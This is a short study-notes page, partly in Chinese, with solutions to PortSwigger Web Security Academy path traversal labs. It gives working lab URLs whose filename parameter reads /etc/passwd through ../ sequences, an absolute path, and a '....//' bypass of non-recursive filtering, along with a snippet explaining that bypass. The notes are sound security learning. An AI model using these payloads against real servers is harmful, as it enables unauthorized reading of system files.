---
title: Path traversal
description: Path traversal
---

## Lab: File path traversal, simple case

| Dimension | Description                                                                                         |
| --------- | --------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-path-traversal#reading-arbitrary-files-via-path-traversal |
| Lab       | https://portswigger.net/web-security/file-path-traversal/lab-simple                                 |

https://0ac500190350f9c38193bb9d002c00e0.web-security-academy.net/image?filename=../../../etc/passwd

## Lab: File path traversal, traversal sequences blocked with absolute path bypass

| Dimension | Description                                                                                                            |
| --------- | ---------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-path-traversal#common-obstacles-to-exploiting-path-traversal-vulnerabilities |
| Lab       | https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass                                      |

https://0a3d002f047dcfbe8067306900890009.web-security-academy.net/image?filename=/etc/passwd

## Lab: File path traversal, traversal sequences stripped non-recursively

| Dimension | Description                                                                                                            |
| --------- | ---------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-path-traversal#common-obstacles-to-exploiting-path-traversal-vulnerabilities |
| Lab       | https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively                        |

假設後端有以下邏輯

```js
path.replaceAll("../", "");
```

那我們可以構造

```
....//
```

結果是

```js
"....//".replaceAll("../", "") => "../"
```

簡單來說，就是利用後端過濾 traversal sequences 的漏洞來達成 Path Traversal，但不同程式語言轉義反斜線 `\` 的方式不一樣，所以要多嘗試(?)

https://0aab00f703a0e8418241bac5006000f6.web-security-academy.net/image?filename=....//....//....//etc/passwd

一次成功，這個 Bypass 技巧我之前都沒想過，算是有學到新的技巧，讚讚

## Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

| Dimension | Description                                                                                                            |
| --------- | ---------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-path-traversal#common-obstacles-to-exploiting-path-traversal-vulnerabilities |
| Lab       | https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode                                    |

## 參考資料

- https://portswigger.net/web-security/file-path-traversal
